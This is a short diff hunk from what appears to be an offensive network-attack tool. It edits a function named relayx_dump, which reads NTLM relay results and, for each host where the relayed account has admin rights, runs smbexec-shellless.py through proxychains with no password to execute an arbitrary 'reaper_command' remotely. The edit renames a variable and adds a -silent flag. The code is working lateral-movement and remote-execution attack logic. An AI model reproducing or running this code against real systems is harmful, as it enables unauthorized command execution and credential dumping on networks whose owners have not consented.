@@ -1755,14 +1755,14 @@ def relayx_dump(reaper_command):
             # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
 
             for item in tmp:
-                dat = item.replace(']', '').split(',')
-                if dat[3] == 'TRUE':
-                    if dat[1] not in dumped_ips:
-                        dumped_ips.append(dat[1])
-                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, dat[2], dat[1], reaper_command))
-                        os.system('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, dat[2], dat[1], reaper_command))
+                relayx_dat = item.replace(']', '').split(',')
+                if relayx_dat[3] == 'TRUE':
+                    if relayx_dat[1] not in dumped_ips:
+                        dumped_ips.append(relayx_dat[1])
+                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        os.system('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
                         with open('{}/hist'.format(cwd), 'a') as f:
-                            f.write(str(dat[1]) + '\n')
+                            f.write(str(relayx_dat[1]) + '\n')
                             f.close()
 
         else:
